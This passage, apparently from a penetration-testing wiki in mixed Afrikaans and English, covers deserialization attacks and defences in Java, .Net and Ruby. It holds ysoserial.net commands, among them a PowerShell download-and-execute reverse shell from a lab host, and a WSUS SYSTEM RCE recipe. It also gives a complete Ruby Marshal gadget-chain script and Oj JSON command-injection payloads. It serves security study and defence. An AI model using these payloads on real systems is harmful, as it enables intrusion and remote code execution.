- **JMX (Java Management Extensions)**: JMX gebruik serialisering om objekte oor die netwerk te stuur.
- **Custom Protocols**: In Java behels die standaardpraktyk die oordrag van rou Java-objekte, wat in die komende exploit-voorbeelde gedemonstreer sal word.

### Prevention

#### Transient objects

'n Klas wat `Serializable` implementeer, kan enige objek binne die klas as `transient` merk wat nie serialiseerbaar behoort te wees nie. Byvoorbeeld:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Vermy serialisering van 'n klas wat Serializable moet implementeer

In scenario's waar sekere **objekte verplig is om die `Serializable`** koppelvlak as gevolg van die klashierargie te implementeer, bestaan daar 'n risiko van onbedoelde deserialisering. Om dit te voorkom, maak seker dat hierdie objekte nie-deserialiseerbaar is deur 'n `final` `readObject()` metode te definieer wat konsekwent 'n uitsondering gooi, soos hieronder getoon:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Verbetering van deserialisasiebeveiliging in Java**

**Customizing `java.io.ObjectInputStream`** is ’n praktiese benadering om deserialisasieprosesse te beveilig. Hierdie metode is geskik wanneer:

- Die deserialisasiekode is onder jou beheer.
- Die klasse wat vir deserialisasie verwag word, is bekend.

Oorskryf die **`resolveClass()`**-metode om deserialisasie slegs tot toegelate klasse te beperk. Dit voorkom deserialisasie van enige klas behalwe diegene wat uitdruklik toegelaat is, soos in die volgende voorbeeld wat deserialisasie slegs tot die `Bicycle`-klas beperk:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Gebruik van 'n Java-agent vir sekuriteitsverbetering** bied 'n noodoplossing wanneer kodewysiging nie moontlik is nie. Hierdie metode is hoofsaaklik van toepassing om **skadelike klasse te swartlys**, deur 'n JVM-parameter te gebruik:
```
-javaagent:name-of-agent.jar
```
Dit bied 'n manier om deserialisering dinamies te beveilig, ideaal vir omgewings waar onmiddellike kode-wysigings onprakties is.

Kyk na 'n voorbeeld in [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Implementering van serialiseringsfilters**: Java 9 het serialiseringsfilters via die **`ObjectInputFilter`** koppelvlak bekendgestel, wat 'n kragtige meganisme bied om kriteria te spesifiseer waaraan geserialiseerde voorwerpe moet voldoen voordat hulle gedeserialiseer word. Hierdie filters kan globaal of per stream toegepas word, wat 'n fynkorrelige beheer oor die deserialiseringsproses bied.

Om serialiseringsfilters te gebruik, kan jy 'n globale filter stel wat op alle deserialiseringsoperasies van toepassing is, of dit dinamies vir spesifieke streams konfigureer. Byvoorbeeld:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Benutting van Eksterne Biblioteke vir Verbeterde Sekuriteit**: Biblioteke soos **NotSoSerial**, **jdeserialize**, en **Kryo** bied gevorderde funksies om Java deserialisering te beheer en te monitor. Hierdie biblioteke kan addisionele sekuriteitslae verskaf, soos witlys- of swartlysing van klasse, analise van serialized objects voordat deserialisering plaasvind, en die implementering van aangepaste serialization-strategieë.

- **NotSoSerial** onderskep deserialiseringsprosesse om die uitvoering van onbetroubare kode te voorkom.
- **jdeserialize** maak dit moontlik om serialized Java objects te ontleed sonder om dit te deserialiseer, wat help om moontlik kwaadwillige inhoud te identifiseer.
- **Kryo** is 'n alternatiewe serialization-raamwerk wat spoed en effektiwiteit beklemtoon, met konfigureerbare serialization-strategieë wat sekuriteit kan verbeter.

### Verwysings

- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- Deserialization and ysoserial talk: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
- [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
- Talk about gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) and slides: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
- Marshalsec paper: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
- [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
- [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
- [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
- Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** talk: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) and slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- Deserialziations CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

Vind wat **JNDI Injection is, hoe om dit te misbruik via RMI, CORBA & LDAP en hoe om log4shell te exploiteer** (en 'n voorbeeld van hierdie kwesbaarheid) op die volgende bladsy:


{{#ref}}
jndi-java-naming-and-directory-interface-and-log4shell.md
{{#endref}}

## JMS - Java Message Service

> The **Java Message Service** (**JMS**) API is a Java message-oriented middleware API for sending messages between two or more clients. It is an implementation to handle the producer–consumer problem. JMS is a part of the Java Platform, Enterprise Edition (Java EE), and was defined by a specification developed at Sun Microsystems, but which has since been guided by the Java Community Process. It is a messaging standard that allows application components based on Java EE to create, send, receive, and read messages. It allows the communication between different components of a distributed application to be loosely coupled, reliable, and asynchronous. (From [Wikipedia](https://en.wikipedia.org/wiki/Java_Message_Service)).

### Produkte

Daar is verskeie products wat hierdie middleware gebruik om boodskappe te stuur:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (1056).png>)

### Uitbuiting

Kortom, daar is 'n **groot aantal dienste wat JMS op 'n onveilige wyse gebruik**. Daarom, as jy **genoeg voorregte** het om boodskappe na hierdie dienste te stuur (gewoonlik benodig jy geldige credentials) kan jy moontlik **malicious objects serialized stuur wat deur die consumer/subscriber gedeserialiseer sal word**.\
Dit beteken dat by hierdie uitbuiting al die **clients wat daardie boodskap gaan gebruik besmet sal raak**.

Onthou dat selfs al is 'n diens kwesbaar (omdat dit user input onveilig deserialiseer), jy steeds geldige gadgets moet vind om die kwesbaarheid te benut.

Die tool [JMET](https://github.com/matthiaskaiser/jmet) is geskep om **hierdie dienste te verbind en aan te val deur verskeie malicious objects serialized te stuur wat bekende gadgets gebruik**. Hierdie exploits sal werk as die diens nog steeds kwesbaar is en as enige van die gebruikte gadgets in die kwesbare toepassing voorkom.

### Verwysings

- [Patchstack advisory – Everest Forms unauthenticated PHP Object Injection (CVE-2025-52709)](https://patchstack.com/articles/critical-vulnerability-impacting-over-100k-sites-patched-in-everest-forms-plugin/)

- JMET talk: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
- Slides: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

In die konteks van .Net werk deserialization exploits op 'n manier soortgelyk aan dié wat in Java gevind word, waar gadgets uitgebuit word om spesifieke kode tydens die deserialisering van 'n object uit te voer.

### Fingerafdruk

#### WhiteBox

Die bronkode moet nagegaan word vir voorkomste van:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Die fokus moet wees op serializers wat die tipe laat bepaal deur 'n veranderlike onder gebruikersbeheer.

#### BlackBox

Die soektog moet die Base64 encoded string **AAEAAAD/////** teiken of enige soortgelyke patroon wat op die server-side deserialiseer kan word en beheer oor die tipe wat gedeserialiseer word gee. Dit kan, maar is nie beperk tot, **JSON** of **XML** strukture wees wat `TypeObject` of `$type` bevat.

### ysoserial.net

In hierdie geval kan jy die tool [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) gebruik om **die deserialization exploits te skep**. Sodra jy die git repository afgelaai het, moet jy die tool **compileer** met byvoorbeeld Visual Studio.

As jy wil leer oor **hoe ysoserial.net sy exploit skep** kan jy [**hierdie bladsy nagaan waar die ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter verduidelik word**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Die hoofopsies van **ysoserial.net** is: **`--gadget`**, **`--formatter`**, **`--output`** en **`--plugin`.**

- **`--gadget`** word gebruik om die gadget aan te dui wat misbruik gaan word (duid die klas/funksie aan wat tydens deserialisering misbruik sal word om opdragte uit te voer).
- **`--formatter`** word gebruik om die metode aan te dui wat die exploit sal serializeer (jy moet weet watter biblioteek die back-end gebruik om die payload te deserialiseer en dieselfde gebruik om dit te serializeer).
- **`--output`** word gebruik om aan te dui of jy die exploit in **raw** of **base64** gekodeerd wil hê. _Let wel dat **ysoserial.net** die payload met **UTF-16LE** sal **encode** (encoding wat standaard op Windows gebruik word), so as jy die raw kry en dit net van 'n linux-konsol kodeer, kan jy sommige **encoding compatibility problems** hê wat verhoed dat die exploit behoorlik werk (in die HTB JSON box het die payload in beide UTF-16LE en ASCII gewerk, maar dit beteken nie dit sal altyd werk nie)._
- **`--plugin`** ysoserial.net ondersteun plugins om **exploits vir spesifieke frameworks** soos ViewState te skep.

#### Meer ysoserial.net parameters

- `--minify` sal 'n **kleiner payload** lewer (indien moontlik)
- `--raf -f Json.Net -c "anything"` Dit sal al die gadgets aandui wat saam met 'n gegewe formatter gebruik kan word (`Json.Net` in hierdie geval)
- `--sf xml` jy kan **'n gadget aandui** (`-g`) en ysoserial.net sal soek na formatters wat "xml" bevat (case insensitive)

**ysoserial examples** to create exploits:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** het ook 'n **baie interessante parameter** wat help om beter te verstaan hoe elke exploit werk: `--test`\
As jy hierdie parameter aandui, sal **ysoserial.net** **probeer** die **exploit lokaal,** sodat jy kan toets of jou payload korrek sal werk.\
Hierdie parameter is nuttig omdat as jy die kode deurgaan, jy blokkies kode soos die volgende sal vind (van [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Dit beteken dat om die exploit te toets sal die kode [serializersHelper.JsonNet_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539) aanroep
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
In die vorige kode is vulnerable to the exploit created. Dus, as jy iets soortgelyks in 'n .Net application vind, beteken dit waarskynlik dat daardie application ook vulnerable is. Daarom laat die **`--test`** parameter ons verstaan watter stukke kode vulnerable is vir die desrialization exploit wat **ysoserial.net** kan skep.

### ViewState

Kyk na [this POST about **how to try to exploit the \_\_ViewState parameter of .Net** ](exploiting-__viewstate-parameter.md) om **execute arbitrary code.** As jy **already know the secrets** wat deur die slagoffer-masjien gebruik word, [**read this post to know to execute code**](exploiting-__viewstate-knowing-the-secret.md).

Real‑world sink: WSUS AuthorizationCookie & Reporting SOAP → BinaryFormatter/SoapFormatter RCE

- Affected endpoints:
- `/SimpleAuthWebService/SimpleAuth.asmx` → GetCookie() AuthorizationCookie decrypted then deserialized with BinaryFormatter.
- `/ReportingWebService.asmx` → ReportEventBatch and related SOAP ops that reach SoapFormatter sinks; base64 gadget is processed when the WSUS console ingests the event.
- Root cause: aanvaller‑beheerde bytes reach legacy .NET formatters (BinaryFormatter/SoapFormatter) without strict allow‑lists/binders, so gadget chains execute as the WSUS service account (often SYSTEM).

Minimale exploitation (Reporting path):
1) Genereer 'n .NET gadget met ysoserial.net (BinaryFormatter or SoapFormatter) en gee base64-uitset, byvoorbeeld:
```powershell
# Reverse shell (EncodedCommand) via BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "powershell -NoP -W Hidden -Enc <BASE64_PS>"

# Simple calc via SoapFormatter (test)
ysoserial.exe -g TypeConfuseDelegate -f SoapFormatter -o base64 -c "calc.exe"
```
2) Skep SOAP vir `ReportEventBatch` wat die base64 gadget inkorporeer en POST dit na `/ReportingWebService.asmx`.
3) Wanneer 'n admin die WSUS-konsol open, word die gebeurtenis gedeserialiseer en die gadget vuurt (RCE as SYSTEM).

AuthorizationCookie / GetCookie()
- 'n vervalste AuthorizationCookie kan aanvaar, ontsleuteld en aan 'n BinaryFormatter sink deurgegee word, wat pre‑auth RCE moontlik maak indien bereikbaar.

Publieke PoC (tecxx/CVE-2025-59287-WSUS) parameters:
```powershell
$lhost = "192.168.49.51"
$lport = 53
$targetURL = "http://192.168.51.89:8530"
```
Sien [Windows Local Privilege Escalation – WSUS](../../windows-hardening/windows-local-privilege-escalation/README.md)

### Voorkoming

Om die risiko's wat met deserialisering in .Net gepaardgaan te beperk:

- **Moenie data-strome toelaat om hul objecttipes te bepaal nie.** Gebruik `DataContractSerializer` of `XmlSerializer` waar moontlik.
- **Vir `JSON.Net`, stel `TypeNameHandling` op `None`:** `TypeNameHandling = TypeNameHandling.None`
- **Moenie `JavaScriptSerializer` saam met `JavaScriptTypeResolver` gebruik nie.**
- **Beperk die tipes wat gedeserialiseer kan word**, en verstaan die inherente risiko's met .Net-tipes, soos `System.IO.FileInfo`, wat bedienerlêers se eienskappe kan verander, wat moontlik tot denial of service-aanvalle kan lei.
- **Wees versigtig met tipes wat riskante eienskappe het**, soos `System.ComponentModel.DataAnnotations.ValidationException` met sy `Value` eienskap, wat misbruik kan word.
- **Beheer tipe-instansiering veilig** om te voorkom dat aanvallers die deserialiseringsproses kan beïnvloed, wat selfs `DataContractSerializer` of `XmlSerializer` kwesbaar kan maak.
- **Implementeer witlysbeheer** deur 'n pasgemaakte `SerializationBinder` vir `BinaryFormatter` en `JSON.Net` te gebruik.
- **Bly ingelig oor bekende onveilige deserialization gadgets** binne .Net en verseker dat deserializers nie sulke tipes instansieer nie.
- **Isoleer potensieel riskante kode** van kode met internettoegang om te voorkom dat bekende gadgets, soos `System.Windows.Data.ObjectDataProvider` in WPF-toepassings, aan onbetroubare databronne blootgestel word.

### **Verwysings**

- Java- en .Net JSON deserialisering **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** praatjie: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) en slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp)
- [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

In Ruby word serialisering moontlik gemaak deur twee metodes binne die **marshal** biblioteek. Die eerste metode, bekend as **dump**, word gebruik om 'n objek in 'n byte-stroom om te skakel. Hierdie proses word serialisering genoem. Die tweede metode, **load**, word daarenteen gebruik om 'n byte-stroom terug te verander in 'n objek, 'n proses wat deserialisering genoem word.

Om geserialiseerde objekte te beveilig, maak **Ruby gebruik van HMAC (Hash-Based Message Authentication Code)**, wat die integriteit en egtheid van die data verseker. Die sleutel wat hiervoor gebruik word, word in een van verskeie moontlike plekke gestoor:

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.X generic deserialization to RCE gadget chain (meer inligting in** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**):**
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Nog 'n RCE-ketting om Ruby On Rails te eksploiteer: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() metode

Soos verduidelik in [**this vulnerability report**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), indien ongefilterde gebruikerinvoer die `.send()` metode van 'n Ruby-objek bereik, laat hierdie metode toe om **enige ander metode** van die objek met enige parameters aan te roep.

Byvoorbeeld, deur eval aan te roep en dan Ruby-kode as tweede parameter te gee, sal dit toelaat om willekeurige kode uit te voer:
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
Verder, indien slegs een parameter van **`.send()`** deur 'n attacker beheer word, soos in die vorige skrywe genoem, is dit moontlik om enige metode van die object aan te roep wat **geen argumente benodig** of waarvan die argumente **standaardwaardes** het.\
Hiervoor is dit moontlik om al die metodes van die object te enumereer om **sommige interessante metodes te vind wat aan daardie vereistes voldoen**.
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
### Ruby class pollution

Kyk hoe dit moontlik is om [pollute a Ruby class and abuse it in here](ruby-class-pollution.md).

### Ruby _json pollution

Wanneer jy in 'n body sekere waardes stuur wat nie hashbaar is nie, soos 'n array, sal hulle bygevoeg word onder 'n nuwe sleutel genaamd `_json`. Dit is egter moontlik vir 'n aanvaller om ook 'n waarde `_json` in die body te stel met die willekeurige waardes wat hy wil hê. As die backend byvoorbeeld die geldigheid van 'n parameter kontroleer maar dan ook die `_json` parameter gebruik om 'n aksie uit te voer, kan 'n authorisation bypass uitgevoer word.

Check more information in the [Ruby _json pollution page](ruby-_json-pollution.md).

### Other libraries

Hierdie tegniek is geneem[ **from this blog post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

Daar is ander Ruby-biblioteke wat gebruik kan word om objekte te serialiseer en dus misbruik kan word om RCE te verkry tydens 'n onveilige deserialisering. Die volgende tabel wys sommige van hierdie biblioteke en die metode wat hulle van die gelaaide library aanroep wanneer dit gedeserialiseer word (funksie wat misbruik kan word om RCE te kry):

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>Biblioteek</strong></td><td><strong>Invoerdata</strong></td><td><strong>Aanvangsmetode binne die klas</strong></td></tr><tr><td>Marshal (Ruby)</td><td>Binary</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (class needs to be put into hash(map) as key)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([see notes regarding json_create at end](#table-vulnerable-sinks))</td></tr></tbody></table>

Basiese voorbeeld:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
In die geval dat mens probeer om Oj te misbruik, was dit moontlik om 'n gadget class te vind wat binne sy `hash` function `to_s` sal aanroep, wat `spec` sal aanroep, wat `fetch_path` sal aanroep — wat gemaak kon word om 'n ewekansige URL te haal — wat 'n uitstekende detector is vir hierdie soort unsanitized deserialization vulnerabilities.
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport",
"path": "/",
"user": "anyuser",
"password": "anypw"
}
```
Boonop is gevind dat met die vorige tegniek 'n lêergids ook in die stelsel geskep word, wat 'n vereiste is om nog 'n gadget te misbruik om dit in 'n volledige RCE te omskep met iets soos:
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
Check for more details in the [**original post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

### Bootstrap Caching

Not really a desearilization vuln but a nice trick to abuse bootstrap caching to to get RCE from a rails application with an arbitrary file write (find the complete [original post in here](https://blog.convisoappsec.com/en/from-arbitrary-file-write-to-rce-in-restricted-rails-apps/)).

Below is a short summary of the steps detailed in the article for exploiting an arbitrary file write vulnerability by abusing Bootsnap caching:

- Identify the Vulnerability and Environment

Die Rails-app se lêeroplaaifunksionaliteit laat 'n aanvaller toe om lêers arbitrêr te skryf. Alhoewel die app onder beperkings loop (slegs sekere gidse soos tmp is skryfbaar weens Docker’s non-root user), maak dit steeds skryf na die Bootsnap cache directory moontlik (tipies onder tmp/cache/bootsnap).

- Understand Bootsnap’s Cache Mechanism

Bootsnap versnel Rails se opstarttye deur compiled Ruby code, YAML, en JSON files te cache. Dit stoor cache files wat 'n cache key header insluit (met velde soos Ruby version, file size, mtime, compile options, etc.) gevolg deur die compiled code. Hierdie header word gebruik om die cache tydens app startup te valideer.

- Gather File Metadata

Die aanvaller kies eers 'n teikenlêer wat waarskynlik tydens Rails startup gelaai word (byvoorbeeld set.rb from Ruby’s standard library). Deur Ruby code binne die container uit te voer, onttrek hulle kritieke metadata (soos RUBY_VERSION, RUBY_REVISION, size, mtime, en compile_option). Hierdie data is noodsaaklik om 'n geldige cache key te skep.

- Compute the Cache File Path

Deur Bootsnap’s FNV-1a 64-bit hash mechanism na te boots, word die korrekte cache file path bepaal. Hierdie stap verseker dat die kwaadwillige cache file presies geplaas word waar Bootsnap dit verwag (e.g., under tmp/cache/bootsnap/compile-cache-iseq/).

- Craft the Malicious Cache File

Die aanvaller berei 'n payload voor wat:

- Executes arbitrary commands (for example, running id to show process info).
- Removes the malicious cache after execution to prevent recursive exploitation.
- Loads the original file (e.g., set.rb) to avoid crashing the application.

Hierdie payload word gecompileer tot binary Ruby code en gekonkateneer met 'n sorgvuldig opgeboude cache key header (gebruik makend van die vooraf versamelde metadata en die korrekte version number vir Bootsnap).

- Overwrite and Trigger Execution

Using the arbitrary file write vulnerability, die aanvaller skryf die opgestelde cache file na die berekende ligging. Daarna trigger hulle 'n server restart (deur na tmp/restart.txt te skryf, wat deur Puma gemonitor word). Tydens restart, wanneer Rails die geteikende lêer require, word die kwaadwillige cache file gelaai, wat in remote code execution (RCE) resulteer.



### Ruby Marshal exploitation in practice (updated)

Treat any path where untrusted bytes reach `Marshal.load`/`marshal_load` as an RCE sink. Marshal rekonstitueer arbitrêre object graphs en trigger library/gem callbacks tydens materialization.


- Minimal vulnerable Rails code path:
```ruby
class UserRestoreController < ApplicationController
def show
user_data = params[:data]
if user_data.present?
deserialized_user = Marshal.load(Base64.decode64(user_data))
render plain: "OK: #{deserialized_user.inspect}"
else
render plain: "No data", status: :bad_request
end
end
end
```
- Algemene gadget classes gesien in werklike chains: `Gem::SpecFetcher`, `Gem::Version`, `Gem::RequestSet::Lockfile`, `Gem::Resolver::GitSpecification`, `Gem::Source::Git`.
- Tipiese side-effect marker ingebed in payloads (executed during unmarshal):
```
*-TmTT="$(id>/tmp/marshal-poc)"any.zip
```
Waar dit in werklike apps oppervlakig word:
- Rails cache- en sessiestores wat histories Marshal gebruik
- Agtergrondjob-backends en lêer-gebaseerde objekstores
- Enige pasgemaakte persistering of vervoer van binêre objek-blobs

Geïndustrialiseerde gadget-ontdekking:
- Grep vir constructors, `hash`, `_load`, `init_with`, of ander metodes met newe-effekte wat tydens unmarshal aangeroep word
- Gebruik CodeQL se Ruby unsafe deserialization queries om sources → sinks te spoor en gadgets te identifiseer
- Valideer met publieke multi-formaat PoCs (JSON/XML/YAML/Marshal)


## Verwysings

